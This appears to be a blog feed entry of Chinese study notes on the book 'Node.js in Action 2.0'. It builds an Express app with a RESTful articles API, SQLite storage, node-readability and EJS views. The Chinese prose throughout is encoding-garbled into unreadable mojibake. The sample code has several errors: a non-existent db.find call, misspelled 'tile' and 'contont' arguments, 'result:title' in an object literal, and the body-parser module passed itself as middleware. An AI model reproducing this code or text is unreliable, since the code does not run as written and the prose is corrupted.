    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ Node Web ç¨‹åºæ˜¯ä»€ä¹ˆäº†è§£ Node Web ç¨‹åºçš„ç»“æž„å…¸åž‹çš„Node Web ç¨‹åºæ˜¯ç”±ä¸‹é¢å‡ éƒ¨åˆ†ç»„æˆçš„ï¼š package.json ï¼š ä¸€ä¸ªåŒ…å«ä¾èµ–é¡¹åˆ—è¡¨å’Œè¿è¡Œè¿™ä¸ªç¨‹åºçš„å‘½ä»¤çš„æ–‡ä»¶ï¼› publicï¼šé™æ€èµ„æºæ–‡ä»¶ node_modules:é¡¹ç›®çš„ä¾èµ–é¡¹ ç¨‹åºä»£ç ï¼š app.js æˆ– index.js ï¼šè®¾ç½®ç¨‹åºçš„ä»£ç  models:æ•°æ®åº“æ¨¡åž‹ views:æ¸²æŸ“é¡µé¢çš„æ¨¡æ¿ controllersæˆ– routes :HTTP è¯·æ±‚å¤„ç†å™¨ middleware: ä¸­é—´ä»¶ç»„ä»¶ å¼€å§‹ä¸€ä¸ªæ–°çš„ Web ç¨‹åºåˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œç„¶åŽè¿è¡Œï¼š 123mkdir latercd laternpm init -fy å®‰è£… express 1npm i express -S å¯ä»¥åœ¨ package.jsonï¼Œçœ‹åˆ°express å·²ç»è¢«å®‰è£…ä¸ŠåŽ»äº† 123&quot;dependencies&quot;: &#123;&quot;express&quot;: &quot;^4.16.4&quot;&#125; å¦‚æžœè¦å¸è½½å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š 1npm rm express -S åˆ›å»ºä¸€ä¸ªç®€å•çš„æœåŠ¡å™¨ 1234567891011121314// index.jsconst express = require('express');// express() åˆ›å»ºä¸€ä¸ªç¨‹åºå®žä¾‹const app = express();const port = process.env.PORT || 3000;// æ·»åŠ è·¯ç”±å¤„ç†å™¨app.get('/',(req,res) =&gt;&#123; res.send('Hello World');&#125;);// ç¨‹åºå®žä¾‹ç»‘å®šåˆ°ä¸€ä¸ª TCPç«¯å£app.listen(port,()=&gt;&#123; console.log(`Express web app available at localhost: $&#123;port&#125;`);&#125;); æ–°å¢ž package.json æ–‡ä»¶çš„ npm è„šæœ¬ 1234"scripts": &#123;"start": "node index.js","test": "echo \"Error: no test specified\" &amp;&amp; exit 1"&#125;, è¿è¡Œç¨‹åºï¼š 1npm start å¯ä»¥çœ‹åˆ°ï¼š è·Ÿå…¶ä»–å¹³å°æ¯”è¾ƒå¦‚æžœåœ¨ PHP å®žçŽ°ä¸Šé¢çš„ç¨‹åºï¼Œä»£ç å¦‚ä¸‹ï¼š 1&lt;?php echo '&lt;p&gt;Hello World&lt;/p&gt;'; ?&gt; åªæœ‰ä¸€è¡Œï¼Œå¹¶ä¸”ä¸€çœ‹å°±æ˜Žç™½ï¼Œé‚£ä¹ˆè¿™ä¸ªæ›´åŠ å¤æ‚çš„ Nodeç¤ºä¾‹æœ‰ä»€ä¹ˆä¼˜ç‚¹å‘¢ï¼ŸäºŒè€…æ˜¯ç¼–ç¨‹èŒƒå¼ä¸Šçš„åŒºåˆ«ï¼šç”¨ PHPï¼Œç¨‹åºæ˜¯é¡µé¢ï¼›Nodeï¼šç¨‹åºæ˜¯æœåŠ¡å™¨ï¼Œè¿™ä¸ªNode ç¤ºä¾‹å¯ä»¥å®Œå…¨æŽ§åˆ¶è¯·æ±‚å’Œå“åº”ï¼Œä¸ç”¨é…ç½®æœåŠ¡å™¨å°±å¯ä»¥åšæ‰€æœ‰äº‹æƒ…ï¼Œå¦‚æžœè¦ç”¨ HTTP åŽ‹ç¼©æˆ– URL è½¬å‘ï¼Œå¯ä»¥å°†è¿™äº›åŠŸèƒ½ä½œä¸ºç¨‹åºçš„é€»è¾‘æ¥å®žçŽ°ã€‚ä¸éœ€è¦æŠŠ HTTP ç¨‹åºå’Œé€»è¾‘åˆ†å¼€ï¼Œå®ƒä»¬æ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ã€‚ æ­å»ºä¸€ä¸ª RESTful Web æœåŠ¡RESTful æœåŠ¡å¯ä»¥æ–¹ä¾¿åˆ›å»ºå’Œä¿å­˜æ–‡ä»¶ï¼Œå°†æ‚ä¹±çš„ Web é¡µé¢å˜å¾—æ•´æ´ã€‚ è®¾è®¡ RESTful æœåŠ¡è¦æƒ³å¥½æ“ä½œï¼Œæ˜ å°„åˆ° Express è·¯ç”±ä¸Šé¢ã€‚æ­¤ä¾‹å­ï¼Œéœ€è¦ä¿å­˜æ–‡ç« ã€èŽ·å–æ–‡ç« ã€èŽ·å–åŒ…å«æ‰€æœ‰æ–‡ç« çš„åˆ—è¡¨å’Œåˆ é™¤ä¸å†éœ€è¦çš„æ–‡ç« è¿™å‡ ä¸ªåŠŸèƒ½ã€‚åˆ†åˆ«å¯¹åº”ä¸‹é¢çš„è·¯ç”±ï¼š POST /articlesï¼šåˆ›å»ºæ–°æ–‡ç«  GET /articles/:id ï¼šèŽ·å–æŒ‡å®šæ–‡ç«  GET /articlesï¼šèŽ·å–æ‰€æœ‰æ–‡ç«  DELETE /articles/:id ï¼šåˆ é™¤æŒ‡å®šæ–‡ç«  ç®€å•çš„ Express ç¨‹åºå®žçŽ°äº†è¿™äº›è·¯ç”±ï¼ŒçŽ°åœ¨ä½¿ç”¨ JavaScript æ¥å­˜å‚¨æ–‡ç«  12345678910111213141516171819202122232425262728293031323334353637// index.jsconst express = require('express');// express() åˆ›å»ºä¸€ä¸ªç¨‹åºå®žä¾‹const app = express();// æ•°ç»„å®šä¹‰ æ–‡ç« articlesconst articles = [&#123; title: 'Example' &#125;];const port = process.env.PORT || 3000;// æ·»åŠ è·¯ç”±å¤„ç†å™¨app.get('/', (req, res) =&gt; &#123; res.send('Hello World');&#125;);// èŽ·å–æ‰€æœ‰æ–‡ç« app.get('/articles', (req, res, next) =&gt; &#123; res.send(articles);&#125;);// åˆ›å»ºä¸€ç¯‡æ–‡ç« app.post('/articles', (req, res, next) =&gt; &#123; res.send('OK');&#125;);// èŽ·å–æŒ‡å®šæ–‡ç« app.get('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; console.log('Fetching:', id); res.send(articles[id]);&#125;);// åˆ é™¤æŒ‡å®šæ–‡ç« app.delete('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; console.log('Deleting:', id); delete articles[id]; res.send(&#123; message: 'Deleted' &#125;);&#125;);// ç¨‹åºå®žä¾‹ç»‘å®šåˆ°ä¸€ä¸ª TCPç«¯å£app.listen(port, () =&gt; &#123; console.log(`Express web app available at localhost: $&#123;port&#125;`);&#125;); Express èƒ½è‡ªåŠ¨å°†æ•°ç»„è½¬æ¢æˆ JSON å“åº”ã€‚ åˆ›å»ºæ–‡ç« ï¼Œå¤„ç† POST è¯·æ±‚éœ€è¦æ¶ˆæ¯ä½“è§£æžã€‚å®‰è£…è§£æžå™¨ 1npm i -S body-parser æ·»åŠ æ¶ˆæ¯è§£æžå™¨: 12345678910111213// æ¶ˆæ¯è§£æžå™¨const bodyParser = require('body-parser');app.use(bodyParser);// æ”¯æŒç¼–ç ä¸º JSON çš„æ¶ˆæ¯è¯·æ±‚ä½“app.use(bodyParser.json());// æ”¯æŒç¼–ç ä¸ºè¡¨å•çš„è¯·æ±‚æ¶ˆæ¯ä½“app.use(bodyParser.urlencoded(&#123; extended: true &#125;));// åˆ›å»ºä¸€ç¯‡æ–‡ç« app.post('/articles', (req, res, next) =&gt; &#123; const article = &#123; title: req.body.title &#125;; articles.push(article); res.send(article);&#125;); æ·»åŠ æ•°æ®åº“å°±å¾€ Nodeç¨‹åºä¸­æ·»åŠ æ•°æ®åº“è€Œè¨€ï¼Œå¹¶æ²¡æœ‰ä¸€å®šä¹‹è§„ï¼Œä½†ä¸€èˆ¬ä¼šæ¶‰åŠä¸‹é¢å‡ ä¸ªæ­¥éª¤ã€‚ (1) å†³å®šæƒ³è¦ç”¨çš„æ•°æ®åº“ç³»ç»Ÿã€‚(2) åœ¨ npmä¸Šçœ‹çœ‹é‚£äº›å®žçŽ°äº†æ•°æ®åº“é©±åŠ¨æˆ–å¯¹è±¡-å…³ç³»æ˜ å°„ï¼ˆORMï¼‰çš„çƒ­é—¨æ¨¡å—ã€‚(3) ç”¨ npm â€“save å°†æ¨¡å—æ·»åŠ åˆ°é¡¹ç›®ä¸­ã€‚(4) åˆ›å»ºæ¨¡åž‹ï¼Œå°è£…æ•°æ®åº“è®¿é—® APIã€‚(5) æŠŠè¿™äº›æ¨¡åž‹æ·»åŠ åˆ° Expressè·¯ç”±ä¸­ã€‚ åˆ›å»ºæ•°æ®åº“ä¹‹å‰ï¼Œæ·»åŠ è·¯ç”±å¤„ç†ä»£ç ï¼Œç¨‹åºæ±‡ä¸­çš„ HTTP è·¯ç”±å¤„ç†ä¼šå‘æ¨¡åž‹å‘èµ·ä¸€ä¸ªç®€å•çš„è°ƒç”¨ 123456app.get('/articles', (req, res, next) =&gt; &#123; Article.all((err, articles) =&gt; &#123; if (err) return err; res.send(articles); &#125;);&#125;); è¿™ä¸ª HTTP è·¯ç”±æ˜¯ç”¨æ¥èŽ·å–æ‰€æœ‰æ–‡ç« çš„ï¼Œæ‰€ä»¥å¯¹åº”çš„æ¨¡åž‹æ–¹æ³•åº”è¯¥ç±»ä¼¼äºŽ Article.all ã€‚è¿™è¦å–å†³äºŽæ•°æ®åº“ APIï¼Œä¸€èˆ¬æ¥è¯´åº”è¯¥æ˜¯ Article.find({}, cb) å’Œ Article.fetchAll().then(cb) ï¼Œå…¶ä¸­çš„ cb æ˜¯å›žè°ƒï¼ˆcallbackï¼‰çš„ç¼©å†™. ä¸Šä¾‹å­ä¸­é€‰æ‹©äº† SQLiteæ•°æ®åº“ï¼Œè¿˜æœ‰çƒ­é—¨çš„ sqlite3 æ¨¡å—ã€‚SQLite æ˜¯è¿›ç¨‹å†…æ•°æ®åº“ï¼Œæ‰€ä»¥å¾ˆæ–¹ä¾¿ï¼šä½ ä¸éœ€è¦åœ¨ç³»ç»Ÿä¸Šå®‰è£…ä¸€ä¸ªåŽå°è¿è¡Œçš„æ•°æ®åº“ã€‚ä½ æ·»åŠ çš„æ‰€æœ‰æ•°æ®éƒ½ä¼šå†™åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºåœæŽ‰åŽå†èµ·æ¥æ—¶æ•°æ®è¿˜åœ¨ï¼Œæ‰€ä»¥éžå¸¸é€‚åˆå…¥é—¨å­¦ä¹ æ—¶ç”¨ã€‚ åˆ¶ä½œè‡ªå·±çš„æ¨¡åž‹ APIæ–‡ç« åº”è¯¥èƒ½è¢«åˆ›å»ºã€èŽ·å–ã€åˆ é™¤ï¼Œæ‰€ä»¥æ¨¡åž‹ Articles åº”è¯¥æä¾›ä¸€ä¸‹çš„æ–¹æ³•ï¼š Article.all(cb)ï¼šè¿”å›žæ–‡ç«  Article.find(id,cd)ï¼šç»™å®šID,æ‰¾åˆ°å¯¹åº”çš„æ–‡ç«  Article.create({title,content},cb)ï¼šåˆ›å»ºä¸€ç¯‡æœ‰æ ‡é¢˜å’Œå†…å®¹çš„æ–‡ç«  Article.delete(id,cb)ï¼šæ ¹æ®IDåˆ é™¤æ–‡ç«  è¿™äº›éƒ½å¯ä»¥ç”¨sqlite3æ¨¡å—å®žçŽ°ã€‚æœ‰äº†è¿™ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ db.all èŽ·å–å¤šè¡Œæ•°æ®ï¼Œç”¨db.getèŽ·å–ä¸€è¡Œæ•°æ®ã€‚ä¸è¿‡å…ˆè¦æœ‰æ•°æ®åº“è¿žæŽ¥ã€‚ å®‰è£… sqlite3ï¼š 1npm i -S sqlite3 æŽ¥ç€åœ¨ ds.js ä¸­å®žçŽ°ä»£ç å®Œæˆä¸Šè¿°åŠŸèƒ½ã€‚ 123456789101112131415161718192021222324252627282930313233343536const sqlite3 = require('sqlite3');const dbName = 'later.sqlite';// æ–°å»ºå¹¶è¿žæŽ¥åˆ°æ•°æ®åº“æ–‡ä»¶const db = new sqlite3.Database(dbName);db.serialize(() =&gt; &#123; // å¦‚æžœè¿˜æ²¡æœ‰ï¼Œåˆ›å»ºä¸€ä¸ª articles è¡¨ const sql = ` CREATE TABLE IF NOT EXISTS articles (id integer primary key, title, content TEXT) `; db.run(sql);&#125;);// å®šä¹‰æ¨¡åž‹ç±» Articleclass Article &#123; // èŽ·å–æ‰€æœ‰æ–‡ç«  static all(cb) &#123; db.all('SELECT * FROM articles', cb); &#125; // é€‰æ‹©ä¸€ç¯‡æŒ‡å®šçš„æ–‡ç«  static find(id, cb) &#123; db.find('SELECT * FROM articles WHERE id = ?', id, cb); &#125; static create(data, cb) &#123; // é—®å·è¡¨ç¤ºå‚æ•° const sql = `INSERT INTO articles(title, content) VALUES (?, ?)`; db.run(sql, data, tile, data.contont, cb); &#125; static delete(id, cb) &#123; if (!id) return cb(new Error('please provide an id')); db.run('DELETE FROM articles WHERE id = ?', id, cb); &#125;&#125;module.exports = db;module.exports.Article = Article; ä¸Šé¢ä¾‹å­ä¸­åˆ›å»ºäº†ä¸€ä¸ª åä¸º Article çš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥ç”¨æ ‡å‡†çš„ SQL å’Œ sqlite3 åˆ›å»ºã€èŽ·å–å’Œåˆ é™¤æ•°æ®ã€‚é¦–å…ˆç”¨ sqlite3.Database æ‰“å¼€ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œç„¶åŽåˆ›å»ºè¡¨çš„ articles ã€‚è¿™é‡Œç”¨åˆ°äº† SQL è¯­æ³• IF NOT EXISTS ,ä»¥é˜²ä¸€ä¸å°å¿ƒé‡æ–°è¿è¡Œäº†ä»£ç åˆ é™¤äº†å‰é¢çš„è¡¨é‡æ–°åˆ›å»ºä¸€ä¸ªã€‚ æ•°æ®åº“å’Œè¡¨å‡†å¤‡å¥½äº†ä¹‹åŽï¼Œå°±å¯ä»¥è¿›è¡ŒæŸ¥è¯¢ã€‚ç”¨ sqlite3 çš„ all æ–¹æ³•å¯ä»¥èŽ·å–çš„æ‰€æœ‰æ–‡ç« ã€‚ç”¨å¸¦é—®å·çš„æŸ¥è¯¢è¯­æ³•æä¾›å…·ä½“å€¼çš„æ–¹æ³•å¯ä»¥èŽ·å–æŒ‡å®šæ–‡ç« ï¼Œsqlite3 ä¼šæŠŠ ID æ’å…¥åˆ°æŸ¥è¯¢è¯­å¥ä¸­ï¼Œæœ€åŽç”¨ run æ–¹æ³•æ’å…¥å’Œåˆ é™¤æ•°æ®ã€‚ åŸºæœ¬çš„æ•°æ®åº“åŠŸèƒ½å·²ç»å®žçŽ°äº†ï¼ŒæŽ¥ç€æˆ‘ä»¬æŠŠå®ƒæ·»åŠ åˆ° HTTP è·¯ç”±ä¸­ã€‚ä¸‹é¢è¿™æ®µä»£ç æ·»åŠ äº†æ‰€æœ‰æ–¹æ³•ï¼Œé™¤äº† POST ã€‚ï¼ˆå› ä¸ºéœ€è¦ç”¨åˆ° readabilityæ¨¡å—ï¼Œä½†ä½ è¿˜æ²¡æœ‰è£…å¥½ï¼Œæ‰€ä»¥è¦å•ç‹¬å¤„ç†ã€‚ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950const express = require('express');// express() åˆ›å»ºä¸€ä¸ªç¨‹åºå®žä¾‹const app = express();// æ¶ˆæ¯è§£æžå™¨const bodyParser = require('body-parser');// åŠ è½½æ•°æ®åº“æ¨¡å— Article ç±»const Article = require('./db').Article;app.use(bodyParser);// æ”¯æŒç¼–ç ä¸º JSON çš„æ¶ˆæ¯è¯·æ±‚ä½“app.use(bodyParser.json());// æ”¯æŒç¼–ç ä¸ºè¡¨å•çš„è¯·æ±‚æ¶ˆæ¯ä½“app.use(bodyParser.urlencoded(&#123; extended: true &#125;));// æ•°ç»„å®šä¹‰ æ–‡ç« articlesconst articles = [&#123; title: 'Example' &#125;];const port = process.env.PORT || 3000;// æ·»åŠ è·¯ç”±å¤„ç†å™¨app.get('/', (req, res) =&gt; &#123; res.send('Hello World');&#125;);// èŽ·å–æ‰€æœ‰æ–‡ç« app.get('/articles', (req, res, next) =&gt; &#123; Article.all((err, articles) =&gt; &#123; if (err) return err; res.send(articles); &#125;);&#125;);// èŽ·å–æŒ‡å®šæ–‡ç« app.get('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; Article.find(id, (err, article) =&gt; &#123; if (err) return next(err); res.send(article); &#125;);&#125;);// åˆ é™¤æŒ‡å®šæ–‡ç« app.delete('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; Article.delete(id, (err) =&gt; &#123; if (err) return next(err); res.send(&#123; message: 'Deleted' &#125;); &#125;);&#125;);// ç¨‹åºå®žä¾‹ç»‘å®šåˆ°ä¸€ä¸ª TCPç«¯å£app.listen(port, () =&gt; &#123; console.log(`Express web app available at localhost: $&#123;port&#125;`);&#125;);module.exports = app; db.js æ–‡ä»¶æ”¾åœ¨åŒä¸ªç›®å½•ï¼ŒNode ä¼šåŠ è½½é‚£ä¸ªæ¨¡å—ï¼Œç„¶åŽç”¨å®ƒèŽ·å–æ‰€æœ‰æ–‡ç« ï¼ŒæŸ¥æ‰¾ç‰¹å®šæ–‡ç« å’Œåˆ é™¤ä¸€ç¯‡æ–‡ç« ã€‚ æœ€åŽä¸€ä»¶äº‹æƒ…æ˜¯å®žçŽ°åˆ›å»ºæ–‡ç« çš„åŠŸèƒ½ã€‚è¿˜è¦ç”¨ readability ç®—æ³•å¤„ç†å®ƒä»¬ã€‚ è®©æ–‡ç« å¯è¯»å¹¶å­˜èµ·æ¥RSETful API å·²ç»æ­å»ºå¥½äº†ï¼Œæ•°æ®ä¹Ÿå¯ä»¥æŒç»­åŒ–åˆ°æ•°æ®åº“ä¸­ï¼ŒæŽ¥ä¸‹æ¥è¯¥å†™ä»£ç æŠŠç½‘é¡µè½¬æ¢æˆç®€åŒ–ç‰ˆçš„ â€œé˜…è¯»è§†å›¾â€ã€‚ä¸è¿‡æˆ‘ä»¬ä¸ç”¨è‡ªå·±å®žçŽ°ï¼Œ npm ä¸­æœ‰è¿™æ ·çš„æ¨¡å—ã€‚ åœ¨ npmä¸Šæœç´¢ readability ä¼šæ‰¾åˆ°å¾ˆå¤šæ¨¡å—ã€‚æˆ‘ä»¬è¯•ä¸€ä¸‹ node-readability: 1npm i node-readability -S è¿™ä¸ªæ¨¡å—æä¾›äº†ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼Œå¯ä»¥ä¸‹è½½æŒ‡å®š URL é¡µé¢å¹¶å°† HTML è½¬æ¢æˆç®€ç‰ˆã€‚ 12345const read = require('node-readability');const url = 'http://www.manning.com/cantelon2/';read(url,(err,result)=&gt;&#123; // ç»“æžœæœ‰.title å’Œ content&#125;) è¿˜å¯ä»¥å’Œæ•°æ®åº“ç±»ç»“åˆèµ·æ¥ï¼Œç”¨ Article.create æ–¹æ³•ä¿å­˜æ–‡ç« ï¼š 12345read(url,(err,result)=&gt;&#123; Article.create(&#123;title:result:title,content: result.content&#125;,(err,article) =&gt;&#123; // å°†æ–‡ç« ä¿å­˜åˆ°æ•°æ®ä¸­ &#125;);&#125;); æ‰“å¼€ index.js æ·»åŠ æ–°çš„ app.post è·¯ç”±å¤„ç†å™¨ï¼Œç”¨ä¸Šé¢çš„æ–¹æ³•æ–¹æ³•å®žçŽ°ä¸‹è½½å’Œä¿å­˜æ–‡ç« çš„åŠŸèƒ½ã€‚ 123456789101112131415const read = require('node-readability');// åˆ›å»ºä¸€ç¯‡æ–‡ç« app.post('/articles', (req, res, next) =&gt; &#123; // ä»Ž POST æ¶ˆæ¯ä½“é‡å¾—åˆ° URL const url = req.body.url; read(url, (err, result) =&gt; &#123; // ç”¨ readabiliry æ¨¡å—èŽ·å–è¿™ä¸ª URL æŒ‡å‘çš„é¡µé¢ if (err || !result) res.status(500).send('Error downloading article'); Article.create(&#123; title: result.title, content: result.content &#125;, (err, article) =&gt; &#123; if (err) return err; // æ–‡ç« ä¿å­˜æˆåŠŸåŽå‘é€æç¤º res.send('OK'); &#125;); &#125;);&#125;); ä¸Šé¢ä»£ç ä¸­ï¼Œå…ˆä»Ž POST æ¶ˆæ¯ä½“ä¸­å¾—åˆ° URL ï¼Œç„¶åŽç”¨ node-readability æ¨¡å—èŽ·å–è¿™ä¸ªURL æŒ‡å‘çš„é¡µé¢ï¼Œç”¨æ¨¡åž‹ç±» Article ä¿å­˜æ–‡ç« ï¼Œå¦‚æžœæœ‰é”™è¯¯ï¼Œå°†å¤„ç†æƒäº¤ç»™ express çš„ä¸­é—´ä»¶æ ˆï¼›å¦åˆ™ï¼Œå°† JSON æ ¼å¼çš„æ–‡ç« å‘é€ç»™å®¢æˆ·ç«¯ã€‚ æ·»åŠ ç”¨æˆ·ç•Œé¢ç»™ Express é¡¹ç›®æ·»åŠ ç•Œé¢éœ€è¦åšçš„å‡ ä»¶äº‹æƒ…ï¼Œé¦–å…ˆæ˜¯ä½¿ç”¨æ¨¡å—å¼•æ“Žã€‚ æ”¯æŒå¤šç§æ ¼å¼åŸºæœ¬åšæ³•æ˜¯ç”¨ Express çš„ res.format æ–¹æ³•ï¼Œå®ƒå¯ä»¥æ ¹æ®è¯·æ±‚å‘é€å“åº”æ ¼å¼çš„å“åº”ã€‚å®ƒçš„ç”¨æ³•å¦‚ä¸‹ï¼Œæä¾›ä¸€ä¸ªåŒ…å«æ ¼å¼å·²ç»å¯¹åº”çš„å“åº”å‡½æ•°çš„åˆ—è¡¨ï¼š 12345678res.format(&#123; html:()=&gt;&#123; res.render('articles.ejs',&#123; articles: articles&#125;); &#125;, json:()=&gt;&#123; res.send(articles); &#125;&#125;); è¿™æ®µä»£ç ä¸­ï¼Œ res.render ä¼šæ¸²æŸ“ view æ–‡ä»¶å¤¹ä¸‹çš„ articles.ejsã€‚ä½†è¿™éœ€è¦å®‰è£…æ¨¡æ¿å¼•æ“Žå¹¶åˆ›å»ºç›¸åº”çš„æ¨¡æ¿ã€‚ æ¸²æŸ“å¼•æ“Žæ¨¡æ¿å¼•æ“Žæœ‰å¾ˆå¤šï¼ŒEJSå±žäºŽç®€å•æ˜“å­¦çš„é‚£ç§ã€‚å®‰è£…ï¼š 1npm i ejs -S res.render å¯ä»¥æ¸²æŸ“ EJS æ ¼å¼ çš„ HTML æ–‡ä»¶ã€‚åœ¨ view æ–‡ä»¶å¤¹ä¸­åˆ›å»º articles.ejs 1234567891011&lt;% include head %&gt;&lt;ul&gt; &lt;% articles.forEach(article =&gt;&#123; %&gt; &lt;li&gt; &lt;a href=&quot;/articles/&lt;%= article.id %&gt;&quot;&gt; &lt;%= article.title %&gt; &lt;/a&gt; &lt;/li&gt; &lt;% &#125;) %&gt;&lt;/ul&gt;&lt;% include foot%&gt; é¡µçœ‰å’Œé¡µè„šæ¨¡å— 1234567891011 &lt;!-- é¡µçœ‰ --&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;!-- é¡µè„š --&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç”¨npmç®¡ç†å®¢æˆ·ç«¯ä¾èµ–é¡¹æ¨¡å—æžå®šä¹‹åŽï¼Œå°±æ˜¯æ ·å¼äº†ã€‚å®‰è£… bootstrap 1npm install bootstrap --save ç„¶åŽåœ¨ node_modules/boostrap é‡Œé¢ä¼šçœ‹åˆ°æºç ï¼Œåœ¨ dist/css é‡Œé¢æœ‰cssæ–‡ä»¶ï¼Œè¦è®©æœåŠ¡å™¨å“åº”é™æ€æ–‡ä»¶è¯·æ±‚æ‰å¯ä»¥ä½¿ç”¨è¿™äº›æ–‡ä»¶ã€‚ Express è‡ªå¸¦äº† ä¸€ä¸ªåä¸º express.static ä¸­é—´ä»¶ï¼Œå¯ä»¥ç»™æµè§ˆå™¨å‘é€å®¢æˆ·ç«¯ JavaScriptã€å›¾ç‰‡å’ŒCSS æ–‡ä»¶ã€‚åªè¦å°†å®ƒæŒ‡å‘åŒ…å«è¿™äº›æ–‡ä»¶çš„ç›®å½•ï¼Œæµè§ˆå™¨å°±å¯ä»¥è®¿é—®åˆ°è¿™äº›æ–‡ä»¶äº†ã€‚ 12// åŠ è½½ cssæ–‡ä»¶app.use('/css/bootstrap.css',express.static('node_modules/bootstrap/dist/css/bootstrap.css')); æŽ¥ç€åœ¨å¤´æ¨¡å—ä¸­å¼•å…¥ 1&lt;link rel="stylesheet" href="/css/bootstrap.css"&gt; è¿™åªæ˜¯ Bootstrapçš„ CSSã€‚å®ƒè¿˜æœ‰å¾ˆå¤šæ–‡ä»¶ï¼ŒåŒ…æ‹¬å›¾æ ‡ã€å­—ä½“ä»¥åŠ jQueryæ’ä»¶ã€‚ä½ å¯ä»¥å¾€é¡¹ç›®é‡Œæ·»åŠ æ›´å¤šæ–‡ä»¶ï¼Œæˆ–è€…ç”¨å·¥å…·æŠŠå®ƒä»¬æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ï¼Œè®©æµè§ˆå™¨æ›´å®¹æ˜“åŠ è½½ã€‚ æ€»ç»“ ç”¨ npm init å’Œ Express å¯ä»¥å¿«é€Ÿæ­å»ºå‡ºä¸€ä¸ª Node Web åº”ç”¨ç¨‹åº npm install æ˜¯å®‰è£…ä¾èµ–é¡¹çš„å‘½ä»¤ å¯ä»¥ç”¨ Express åˆ¶ä½œå¸¦æœ‰ RESTful API çš„ Web ç¨‹åº é€‰æ‹©é€‚åˆçš„æ•°æ®åº“ç³»ç»Ÿå’Œæ•°æ®åº“æ¨¡æ¿æ ¹æ®ä¸ªäººéœ€æ±‚ å¯¹äºŽå°é¡¹ç›®æ¥è¯´ï¼ŒSQLite å¾ˆå¥½ç”¨ åœ¨ Express ä¸­ç”¨EJSæ¸²æŸ“æ¨¡æ¿å¾ˆå®¹æ˜“ Express æ”¯æŒå¾ˆå¤šæ¨¡å—å¼•æ“Žï¼ŒåŒ…æ‹¬Pugå’ŒMustache]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” Nodeç¼–ç¨‹åŸºç¡€]]></title>
    <url>%2F2018-12-01-NodeJs2-Part2.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ Nodeç¼–ç¨‹åŸºç¡€æœ¬ç« å†…å®¹ï¼š ç”¨æ¨¡å—ç»„ç»‡ä»£ç  ç”¨å›žè°ƒå¤„ç†ä¸€æ¬¡æ€§æ—¶é—´ ç”¨äº‹ä»¶å‘å°„å™¨å¤„ç†é‡å¤æ€§äº‹ä»¶ å®žçŽ°ä¸²è¡Œå’Œå¹¶è¡Œçš„æµç¨‹æŽ§åˆ¶ ä½¿ç”¨æµç¨‹æŽ§åˆ¶å·¥å…· æœ¬ç« è¦è§£å†³æ‘†åœ¨Node æ–°æ‰‹å¼€å‘é¢å‰çš„ä¸¤ä¸ªéš¾é¢˜: å¦‚ä½•ç»„ç»‡ä»£ç  å¦‚ä½•å®žçŽ°å¼‚æ­¥ç¼–ç¨‹ å¦‚ä½•å“åº”ä¸€æ¬¡æ€§äº‹ä»¶ å¦‚ä½•å¤„ç†é‡å¤æ€§äº‹ä»¶ å¦‚ä½•è®©å¼‚æ­¥é€»è¾‘é¡ºåºæ‰§è¡Œ Node åŠŸèƒ½çš„ç»„ç»‡åŠé‡ç”¨ä¼ ç»Ÿçš„æ–¹å¼æ˜¯æŒ‰é€»è¾‘ç›¸å…³æ€§å¯¹ä»£ç åˆ†ç»„ï¼Œå°†åŒ…å«å¤§é‡ä»£ç çš„å•ä¸ªæ–‡ä»¶åˆ†è§£æˆå¤šä¸ªæ–‡ä»¶ã€‚ å¯¹äºŽæ•´åˆä¸€ä¸ªæ–‡ä»¶ï¼ˆâ€™includedâ€™æ–‡ä»¶ï¼‰ä¸­çš„é€»è¾‘ï¼ŒåŽé¢å¼•å…¥è¿™ä¸ªæ–‡ä»¶é‡Œé¢çš„ä»»ä½•å˜é‡æˆ–è€…æ˜¯å‡½æ•°å¯èƒ½ä¼šè¦†ç›–åº”ç”¨ç¨‹åºåŽŸæ¥çš„ç›¸åŒçš„å˜é‡æˆ–è€…æ˜¯å‡½æ•°ã€‚ åœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ å‘½åç©ºé—´ è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ Ruby é€šè¿‡æ¨¡å—ä¹Ÿæä¾›äº†ç±»ä¼¼çš„åŠŸèƒ½ã€‚ä½† Node çš„åšæ³•æ˜¯ä¸ç»™ä½ æœ‰æ±¡æŸ“å‘½åç©ºé—´çš„æœºä¼šã€‚ Node æ¨¡å—æ‰“åŒ…ä»£ç æ˜¯ä¸ºäº†é‡ç”¨ï¼Œä½†æ˜¯ä¸ä¼šæ”¹å˜å…¨å±€ä½œç”¨åŸŸã€‚Node 